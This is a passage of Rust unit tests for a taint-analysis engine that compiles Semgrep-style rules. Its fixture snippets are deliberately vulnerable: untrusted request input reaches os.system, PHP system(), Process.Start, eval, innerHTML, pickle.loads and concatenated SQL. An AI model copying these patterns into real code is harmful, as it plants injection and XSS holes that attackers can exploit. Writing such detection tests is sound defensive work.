        var command = new SqlCommand("SELECT 1", userInput);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "taint at arg1 (`new SqlCommand(literal, userInput)`) must NOT fire \
             for a first-argument focus"
        );
    }

    #[test]
    fn parse_arg_to_receiver_propagator_covers_registry_shapes() {
        // The four registry propagator shapes (Java x3 + C# x1) are all
        // "argument taints receiver".
        let cases: &[(&str, &str, &str, Option<&str>)] = &[
            // java/spring tainted-system-command
            (
                "(StringBuilder $STRB).append($INPUT)",
                "$INPUT",
                "$STRB",
                Some("append"),
            ),
            // java/lang formatted-sql-string (StringBuffer + StringBuilder)
            ("(StringBuffer $S).append($X)", "$X", "$S", Some("append")),
            // java/spring tainted-html-string (variadic argument metavar)
            (
                "(StringBuilder $SB).append($...TAINTED)",
                "$...TAINTED",
                "$SB",
                Some("append"),
            ),
            // csharp/lang csharp-sqli (metavariable method → any method)
            (
                "(StringBuilder $B).$ANY(...,(string $X),...)",
                "$X",
                "$B",
                None,
            ),
        ];
        for (pat, from, to, want_method) in cases {
            let p = parse_arg_to_receiver_propagator(pat, from, to)
                .unwrap_or_else(|| panic!("`{pat}` should compile as arg→receiver"));
            assert_eq!(p.method.as_deref(), *want_method, "method for `{pat}`");
        }

        // Non-call / augmented-assignment shape is NOT compiled (deferred).
        assert!(
            parse_arg_to_receiver_propagator("$VAR += $...TAINTED", "$...TAINTED", "$VAR")
                .is_none(),
            "augmented assignment is out of the arg→receiver subset"
        );
        // `$S` must not loose-match `$STR` inside a receiver cast.
        assert!(
            parse_arg_to_receiver_propagator("(StringBuilder $STR).append($X)", "$X", "$S")
                .is_none(),
            "`$S` should not match `$STR` (metavariable boundary)"
        );
    }

    // ── MemberAssign shape tests ──────────────────────────────────────────

    #[test]
    fn compile_member_assign_sink_produces_member_assign() {
        // The canonical Semgrep DOM-XSS pattern is `$EL.innerHTML = $X`.
        // The bridge must compile this to `MemberAssign { field: "innerHTML" }`.
        let m = compile("$EL.innerHTML = $X", MatcherRole::Sink).expect("MemberAssign");
        match m {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "innerHTML"),
            _ => panic!("expected MemberAssign"),
        }
    }

    #[test]
    fn compile_member_assign_sanitizer_produces_member_assign() {
        let m =
            compile("$EL.outerHTML = $X", MatcherRole::Sanitizer).expect("MemberAssign sanitizer");
        match m {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "outerHTML"),
            _ => panic!("expected MemberAssign"),
        }
    }

    #[test]
    fn compile_member_assign_source_is_rejected() {
        // A `$EL.field = $X` source does not make semantic sense —
        // property assignment is a sink, not an origin.
        assert!(compile("$EL.innerHTML = $X", MatcherRole::Source).is_none());
    }

    #[test]
    fn member_assign_equality_operator_is_rejected() {
        // `==` is a comparison, not an assignment — must not compile.
        assert!(compile("$EL.innerHTML == $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn member_assign_plain_receiver_not_compiled_as_member_assign() {
        // `el.innerHTML = $X` with a plain identifier receiver is NOT a
        // MemberAssign pattern (the receiver must be a metavariable).
        // It has `=` but will fail `parse_member_assign_pattern` and then
        // also fail the call/identifier checks, so it returns None.
        assert!(compile("el.innerHTML = $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn member_assign_multi_segment_lhs_is_rejected() {
        // `$EL.a.b = $X` is ambiguous — only single-segment property names
        // are supported for the MemberAssign shape.
        assert!(compile("$EL.a.b = $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn taint_rule_with_member_assign_sink_compiles() {
        let r = compiled(
            r#"
id: js-dom-xss-innerhtml
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted input reaches innerHTML"
metadata:
  cwe: "CWE-79"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );
        assert_eq!(r.spec.sinks.len(), 1);
        match &r.spec.sinks[0] {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "innerHTML"),
            other => panic!("expected MemberAssign sink, got {:?}", other),
        }
    }

    #[test]
    fn js_taint_member_assign_sink_produces_finding() {
        use crate::engine::parser::parse_file;

        // Rule uses `$EL.innerHTML = $X` — bridge compiles to MemberAssign.
        // The JavaScript engine's assignment handler checks MemberAssign sinks
        // via `match_member_assign_sink` (taint_engine.rs line 629).
        let rule = compiled(
            r#"
id: js-dom-xss-innerhtml-e2e
mode: taint
languages: [javascript]
severity: ERROR
message: "DOM XSS via innerHTML"
metadata:
  cwe: "CWE-79"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );

        let src = r#"
function handler(req) {
    var data = req.query.name;
    document.getElementById("target").innerHTML = data;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("JS fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for req.query -> innerHTML flow, got none"
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .is_some_and(|d| d.contains("innerHTML")),
            "sink description should mention innerHTML: {:?}",
            findings[0]
        );
    }

    #[test]
    fn js_taint_member_assign_non_matching_field_does_not_fire() {
        use crate::engine::parser::parse_file;

        // Rule matches `innerHTML` only — assignment to `textContent` (which
        // is NOT an XSS sink) must NOT fire.
        let rule = compiled(
            r#"
id: js-dom-xss-innerhtml-neg
mode: taint
languages: [javascript]
severity: ERROR
message: "DOM XSS via innerHTML"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );

        let src = r#"
function handler(req) {
    var data = req.query.name;
    document.getElementById("target").textContent = data;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("JS fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "textContent assignment should NOT trigger the innerHTML rule, got {:?}",
            findings
        );
    }

    // ── `patterns:` AND-block inside source/sink ──────────────────────────

    /// (a) source/sink using single-pattern `patterns:` block — must produce a
    /// source→sink finding just like a bare `pattern:` entry would.
    #[test]
    fn patterns_block_single_pattern_source_to_sink_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: patterns-block-single-pattern
mode: taint
languages: [python]
severity: ERROR
message: "Tainted data reaches pickle.loads"
pattern-sources:
  - patterns:
      - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: pickle.loads($X)
"#,
        );
        // sources and sinks must both compile from the patterns: block
        assert_eq!(rule.spec.sources.len(), 1, "source from patterns: block");
        assert_eq!(rule.spec.sinks.len(), 1, "sink from patterns: block");

        let src = r#"
import pickle
def view(request):
    data = request.data
    result = pickle.loads(data)
    return result
"#;
        let tree = parse_file(src, Language::Python).expect("Python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.data -> pickle.loads flow, got none"
        );
    }

    /// (b) `patterns:` block containing `pattern-either:` — must compile all
    /// alternatives and match accordingly.
    #[test]
    fn patterns_block_with_pattern_either_compiles_all_alternatives() {
        let r = compiled(
            r#"
id: patterns-block-pattern-either
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: pickle.loads($X)
          - pattern: pickle.load($X)
          - pattern: eval($X)
"#,
        );
        // All three alternatives inside pattern-either inside patterns: must compile.
        assert_eq!(
            r.spec.sinks.len(),
            3,
            "expected 3 sink matchers from patterns: {{ pattern-either: [3] }}"
        );
    }

    /// (c) `patterns:` block with an unsupported narrowing constraint still
    /// compiles via the expressible matcher — documented broadening, no crash.
    #[test]
    fn patterns_block_with_unsupported_constraint_compiles_with_broadening() {
        // This mirrors the real-world shape: event source narrowed by
        // pattern-inside (which we cannot enforce), plus a focus-metavariable
        // and pattern-either for the real node shape.
        let r = compiled(
            r#"
id: patterns-block-broadening
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern-inside: |
          def handler(event, context):
            ...
      - pattern: event
pattern-sinks:
  - patterns:
      - focus-metavariable: $CMD
      - pattern-either:
          - pattern: os.system($CMD)
          - pattern: os.popen($CMD)
"#,
        );
        // Source: `event` from the patterns: block (pattern-inside dropped)
        assert_eq!(
            r.spec.sources.len(),
            1,
            "source compiled despite dropped pattern-inside"
        );
        // Sinks: os.system + os.popen from pattern-either (focus-metavariable dropped)
        assert_eq!(
            r.spec.sinks.len(),
            2,
            "sinks compiled despite dropped focus-metavariable"
        );
    }

    /// (d) `patterns:` block with NO expressible matcher — warn-skips
    /// gracefully without crashing. When all entries in a role are skipped the
    /// whole rule is skipped.
    #[test]
    fn patterns_block_no_expressible_matcher_warn_skips_gracefully() {
        // Only constraint-only keys inside the patterns: block → no matcher
        // extracted → entry produces nothing → sources empty → whole rule skipped.
        let yaml = r#"
id: patterns-block-no-expressible
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern-inside: |
          def handler(event, context):
            ...
      - focus-metavariable: $X
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Skip(msg) => {
                assert!(
                    msg.contains("pattern-sources"),
                    "skip message should mention pattern-sources: {msg}"
                );
            }
            TaintRuleParse::Compiled(_) => {
                panic!("expected Skip when patterns: block has no expressible matchers")
            }
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    // ── Bridge-level (end-to-end) tests for PHP taint ────────────────────────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) where the source is a bare identifier (`$_GET`) with no parens.
    // The bridge compiles those to `GenericMatcher::ParamName`, which is the
    // path that was previously broken end-to-end for other languages.
    // We assert the sink line and that a sanitized variant produces no finding.

    /// `$_GET['cmd'] → system($c)` via the bare-identifier `$_GET` source.
    #[test]
    fn php_bridge_bare_get_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = "<?php\nfunction handle() {\n  $c = $_GET['cmd'];\n  system($c);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for $_GET['cmd'] -> system, got {:?}",
            findings
        );
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// A sanitizer (escapeshellarg) between a bare-identifier `$_GET` source
    /// and the sink blocks the flow end-to-end.
    #[test]
    fn php_bridge_bare_get_source_sanitized_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi-sanitized
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sanitizers:
  - pattern: escapeshellarg($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src =
            "<?php\nfunction handle() {\n  $c = escapeshellarg($_GET['cmd']);\n  system($c);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized $_GET flow must produce no finding, got {:?}",
            findings
        );
    }

    /// Near-miss: `$_GET` is assigned but the literal `'ls'` is passed to the
    /// sink — must produce no finding.
    #[test]
    fn php_bridge_bare_get_source_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi-nearmiss
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = "<?php\nfunction handle() {\n  $tainted = $_GET['cmd'];\n  $safe = 'ls';\n  system($safe);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "untainted argument must not fire, got {:?}",
            findings
        );
    }

    /// PHP taint rule with `languages: [php]` compiles cleanly.
    #[test]
    fn taint_rule_with_php_language_compiles() {
        let yaml = r#"
id: php-taint
mode: taint
languages: [php]
severity: ERROR
message: m
pattern-sources: [{pattern: $_GET}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Php);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    // ─── Bridge-level (end-to-end) tests for C# taint engine ─────────────────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) and run it against real C# source via the bridge. We test the
    // primary dotted-source shapes that arrive as `Attribute` / `Call` matchers
    // through the bridge (not `ParamName`, since C# sources are dotted).

    /// `Request.QueryString["cmd"] → Process.Start(cmd)` fires end-to-end.
    #[test]
    fn csharp_bridge_dotted_source_to_process_start_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-cmd-injection
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Process.Start"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: Request.QueryString
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        let src = r#"
using System.Web;
using System.Diagnostics;

class Controller {
    public void Handle() {
        string cmd = Request.QueryString["cmd"];
        Process.Start(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for Request.QueryString -> Process.Start, got {:?}",
            findings
        );
        assert!(
            findings[0].line > 0,
            "finding should carry a valid line number"
        );
    }

    /// Sanitized variant: `HttpUtility.HtmlEncode(raw)` blocks XSS.
    #[test]
    fn csharp_bridge_sanitized_variant_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-xss-sanitized
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Response.Write"
pattern-sources:
  - pattern: Request.QueryString
pattern-sanitizers:
  - pattern: HttpUtility.HtmlEncode($X)
pattern-sinks:
  - pattern: Response.Write($X)
"#,
        );

        let src = r#"
using System.Web;

class Controller {
    public void Handle() {
        string raw = Request.QueryString["q"];
        string safe = HttpUtility.HtmlEncode(raw);
        Response.Write(safe);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized flow must produce no finding, got {:?}",
            findings
        );
    }

    /// Near-miss: tainted variable not passed to the sink → no finding.
    #[test]
    fn csharp_bridge_near_miss_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-cmd-nearmiss
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Process.Start"
pattern-sources:
  - pattern: Request.QueryString
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        // tainted is assigned but a literal "notepad.exe" is passed to the sink.
        let src = r#"
using System.Web;
using System.Diagnostics;

class Controller {
    public void Handle() {
        string _tainted = Request.QueryString["cmd"];
        Process.Start("notepad.exe");
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "near-miss must produce no finding, got {:?}",
            findings
        );
    }

    /// `csharp` language alias parses correctly.
    #[test]
    fn taint_rule_with_csharp_language_compiles() {
        let yaml = r#"
id: cs-taint
mode: taint
languages: [csharp]
severity: ERROR
message: m
pattern-sources: [{pattern: Request.QueryString}]
pattern-sinks: [{pattern: Process.Start($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::CSharp);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    /// `cs` alias compiles as C#.
    #[test]
    fn taint_rule_with_cs_alias_compiles_as_csharp() {
        let yaml = r#"
id: cs-taint
mode: taint
languages: [cs]
severity: ERROR
message: m
pattern-sources: [{pattern: Request.QueryString}]
pattern-sinks: [{pattern: Process.Start($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::CSharp),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    /// `Console.ReadLine()` → `Process.Start()` fires via Call source.
    #[test]
    fn csharp_bridge_console_readline_to_process_start() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-console-cmdi
mode: taint
languages: [csharp]
severity: ERROR
message: "Console.ReadLine input reaches Process.Start"
pattern-sources:
  - pattern: Console.ReadLine($X)
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        let src = r#"
using System;
using System.Diagnostics;

class App {
    static void Main() {
        string cmd = Console.ReadLine();
        Process.Start(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for Console.ReadLine -> Process.Start, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: FieldName (any-receiver property read source) ────
    //
    // These compile a rule with a `$METAVAR.field` source through the SAME
    // `parse_taint_rule` path the CLI uses, then run the compiled rule against
    // a real vulnerable source string and assert it FIRES — proving the new
    // shape is wired end-to-end through the bridge AND the engine. A safe
    // variant (no tainted property read) must NOT fire.

    /// Python: `$REQ.body` source → `os.system` sink. `req.body` is a property
    /// read on a metavariable receiver — only `FieldName` can express it.
    #[test]
    fn python_bridge_fieldname_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-fieldname-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request body reaches os.system"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - pattern: os.system($X)
"#,
        );
        // FieldName compiles a property read of `.body`.
        assert!(matches!(
            rule.spec.sources.as_slice(),
            [GenericMatcher::FieldName { field, .. }] if field == "body"
        ));

        let src = r#"
def handler(req):
    data = req.body
    os.system(data)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.body -> os.system, got {:?}",
            findings
        );
    }

    /// Python safe variant: a value that is NOT the `.body` property read must
    /// not be flagged, proving FieldName is field-specific (not "any read").
    #[test]
    fn python_bridge_fieldname_safe_property_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-fieldname-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request body reaches os.system"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - pattern: os.system($X)
"#,
        );

        let src = r#"
def handler(req):
    data = req.session
    os.system(data)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "req.session is not `.body`; expected no finding, got {:?}",
            findings
        );
    }

    /// JavaScript: `$REQ.query` source → `eval` sink, exercising the JS
    /// `member_expression` FieldName path through the bridge.
    #[test]
    fn javascript_bridge_fieldname_source_to_eval_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-fieldname-eval
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted req.query reaches eval"
pattern-sources:
  - pattern: $REQ.query
pattern-sinks:
  - pattern: eval($X)
"#,
        );

        let src = r#"
function handler(req) {
    const q = req.query;
    eval(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.query -> eval, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Subscript (index/subscript access source) ────────

    /// Python: `request.POST[...]` source → `os.system` sink. The subscript
    /// base's final segment is `POST`.
    #[test]
    fn python_bridge_subscript_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-subscript-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request.POST reaches os.system"
pattern-sources:
  - pattern: request.POST[...]
pattern-sinks:
  - pattern: os.system($X)
"#,
        );
        assert!(matches!(
            rule.spec.sources.as_slice(),
            [GenericMatcher::Subscript { base: Some(b), .. }] if b == "POST"
        ));

        let src = r#"
def handler(request):
    cmd = request.POST["c"]
    os.system(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.POST[...] -> os.system, got {:?}",
            findings
        );
    }

    /// Python safe variant: a subscript on a different base (`safe[...]`)
    /// must not fire when the rule wants `request.POST[...]`.
    #[test]
    fn python_bridge_subscript_safe_base_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-subscript-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request.POST reaches os.system"
pattern-sources:
  - pattern: request.POST[...]
pattern-sinks:
  - pattern: os.system($X)
"#,
        );

        let src = r#"
def handler(config):
    cmd = config.SETTINGS["c"]
    os.system(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "config.SETTINGS[...] is not request.POST[...]; expected no finding, got {:?}",
            findings
        );
    }

    /// PHP: `$_GET[...]` subscript source → `system` sink via the bridge.
    #[test]
    fn php_bridge_subscript_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-subscript-cmdi
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET[...]
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"<?php
function handler() {
    $cmd = $_GET["c"];
    system($cmd);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for $_GET[...] -> system, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ReceiverCall (`receiver.$METHOD(...)` sink) ──────

    /// Python: `request.args` source → `os.$METHOD(...)` sink. The sink is a
    /// metavariable method on a concrete `os` receiver — only `ReceiverCall`
    /// can express it.
    #[test]
    fn python_bridge_receivercall_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-receivercall-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request reaches os.<any>"
pattern-sources:
  - pattern: $REQ.cmd
pattern-sinks:
  - pattern: os.$METHOD(...)
"#,
        );
        assert!(matches!(
            rule.spec.sinks.as_slice(),
            [GenericMatcher::ReceiverCall { receiver, .. }] if receiver == "os"
        ));

        let src = r#"
def handler(req):
    c = req.cmd
    os.system(c)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.cmd -> os.system (os.$METHOD), got {:?}",
            findings
        );
    }

    /// Python safe variant: a call on a DIFFERENT receiver (`safe.run`) must
    /// not be flagged when the rule wants `os.$METHOD(...)`.
    #[test]
    fn python_bridge_receivercall_other_receiver_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-receivercall-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request reaches os.<any>"
pattern-sources:
  - pattern: $REQ.cmd
pattern-sinks:
  - pattern: os.$METHOD(...)
"#,
        );

        let src = r#"
def handler(req):
    c = req.cmd
    logger.info(c)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "logger.info is not os.$METHOD; expected no finding, got {:?}",
            findings
        );
    }

    /// Ruby: bare `params` source → `Kernel.$X(...)` ReceiverCall sink.
    #[test]
    fn ruby_bridge_receivercall_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-receivercall-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches Kernel.<any>"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: Kernel.$X(...)
"#,
        );

        let src = r#"
def handler
  cmd = params[:cmd]
  Kernel.system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for params -> Kernel.system (Kernel.$X), got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: BinopFormat (`"$SQL" + $X` / f-string sink) ──────

    /// Python: `request.args` source → `"$SQLSTR" + ...` concatenation sink.
    /// The sink is a string-building binary `+` — only `BinopFormat` can
    /// express it.
    #[test]
    fn python_bridge_binop_format_concat_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-sqli
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler(req):
    name = req.args
    query = "SELECT * FROM t WHERE n = " + name
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Python safe variant: a literal-only concatenation with NO tainted
    /// operand must not fire, proving `BinopFormat` is not over-broad.
    #[test]
    fn python_bridge_binop_format_untainted_concat_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-sqli-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
def handler(req):
    name = req.args
    query = "SELECT * FROM t WHERE n = " + "constant"
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only concat has no tainted operand; expected no finding, got {:?}",
            findings
        );
    }

    /// Python: f-string interpolation sink `f"...{$X}..."` with a tainted
    /// interpolated value fires.
    #[test]
    fn python_bridge_binop_format_fstring_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-fstring-sqli
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into an f-string SQL"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: 'f"...{$X}..."'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "f-string sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler(req):
    name = req.args
    query = f"SELECT * FROM t WHERE n = {name}"
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> f-string, got {:?}",
            findings
        );
    }

    /// Python: percent-format sink `"$HTMLSTR" % ...` with a tainted operand
    /// fires (old-style string formatting).
    #[test]
    fn python_bridge_binop_format_percent_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-percent-html
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a percent-formatted string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$HTMLSTR" % ...'
"#,
        );

        let src = r#"
def handler(req):
    name = req.args
    page = "<b>%s</b>" % name
    render(page)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> \"...\" % name, got {:?}",
            findings
        );
    }

    /// Go: a request field-read source → `"$SQLSTR" + ...` concat sink.
    /// Confirms the Go engine matches `BinopFormat` on `binary_expression`.
    #[test]
    fn go_bridge_binop_format_concat_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: go-binop-sqli
mode: taint
languages: [go]
severity: ERROR
message: "Tainted request value flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.Body
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "go sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
package main

func handler(r *Request) {
    name := r.Body
    query := "SELECT * FROM t WHERE n = " + name
    db.Exec(query)
}
"#;
